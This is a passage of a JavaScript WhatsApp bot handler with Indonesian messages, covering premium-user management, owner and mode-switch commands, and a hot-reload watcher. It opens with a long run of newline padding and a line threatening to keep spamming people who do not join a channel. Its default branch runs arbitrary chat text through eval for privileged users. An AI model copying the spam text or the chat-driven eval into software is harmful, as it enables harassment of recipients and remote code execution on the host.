n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n

*⪻ 𝐌𝐚𝐬𝐮𝐤 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐆𝐰 𝐖𝐨𝐲 ⪼*
${global.Andrazyy6}

GAK MASUK GW SPAM TERUS 😹`)
}
break

case 'addprem': case 'addacces': {
if (!Access) return cici_syantikreply(mess.owner)
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return cici_syantikreply(`mana nomornya dan mau berapa hari? contoh : ${prefix + command} @tag|30d`)
    if (!hari) return cici_syantikreply(`mau yang berapa hari njrr?`)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return cici_syantikreply('lol, owner kan bebas')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return cici_syantikreply('Suscesfully add premium🐉')
    let data = await cici_syantik.onWhatsApp(users)
    if (data[0].exists) {
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = ('Suscesfully add premium🐉')
        const contentText = {
            text: teks,
            contextInfo: {	
                externalAdReply: {
                    title: `premium user`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://img1.pixhost.to/images/5120/589174536_yanzhosting.jpg`,
                    sourceUrl: 'https://whatsapp.com/channel/0029Vb30zLXLo4hWVPChF41q'
                }	
            }	
        };	
        return cici_syantik.sendMessage(m.chat, contentText, { quoted: m })
    } else {		
         cici_syantikreply("not found")
    }	
}
break

case 'owner': case 'own': {
m.reply(`https://${global.owner} NIH OWNER GW, JANGAN MACEM MACEM.!!
> čicítzy viléstâ (¢)`)
}
break
                
case 'delprem': case 'delacces': {
if (!Access) return cici_syantikreply(mess.owner)
    if (!args[0]) return cici_syantikreply(`siapa yang mau di ${command}? gunakan nomor/tag, contoh : ${prefix}delprem @tag`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return cici_syantikreply("bukan user premium ini mah")
    let data = await cici_syantik.onWhatsApp(users)
    if (data[0].exists) {	
        let premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(premium))		
        cici_syantikreply('user tersebut telah di hapus')
    } else {	
        cici_syantikreply("not found")
    }
}
break

case 'public': {
if (!isPremium) return cici_syantikreply(" maaf kamu tidak memiliki akses ")
cici_syantik.public = true
cici_syantikreply(`*berhasil mengubah bot ke mode public*`)
}
break

case 'self': {
if (!isPremium) return cici_syantikreply(" maaf kamu tidak memiliki akses ")
cici_syantik.public = false
cici_syantikreply(`*berhasil mengubah bot ke mode self*`)
}
break

default:
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}
        
if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}
        
}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})
